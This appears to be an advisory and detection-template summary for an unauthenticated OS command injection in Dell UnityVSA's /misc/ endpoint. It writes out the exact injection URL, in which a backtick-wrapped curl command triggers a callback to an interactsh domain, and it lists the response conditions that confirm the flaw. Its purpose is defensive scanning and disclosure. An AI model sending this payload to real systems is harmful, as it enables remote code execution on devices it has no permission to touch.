## Vulnerability
Dell UnityVSA versions 5.5 and prior contains an OS Command Injection (CWE-78) flaw in the `/misc/` endpoint. An unauthenticated remote attacker can inject arbitrary commands via specially crafted URLs, resulting in full remote code execution (RCE) with high confidentiality, integrity, and availability impact (CVSS 3.1: 9.8, AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). The flaw stems from improper neutralization of special elements passed to the underlying OS command. Remediation requires updating to a version beyond 5.5.

## PoC / Detection
Classification: rce  
The template issues a single unauthenticated GET request to `{{BaseURL}}/misc/`curl${IFS}{{interactsh-url}}`/..;/index.html`, embedding a backtick-wrapped command that forces a DNS callback to an attacker-controlled interactsh domain via curl. Detection succeeds only if all four conditions match: HTTP 200 status, response body contains the string "getUrlVars", Content-Type includes "text/html", and an interactsh DNS interaction is recorded.
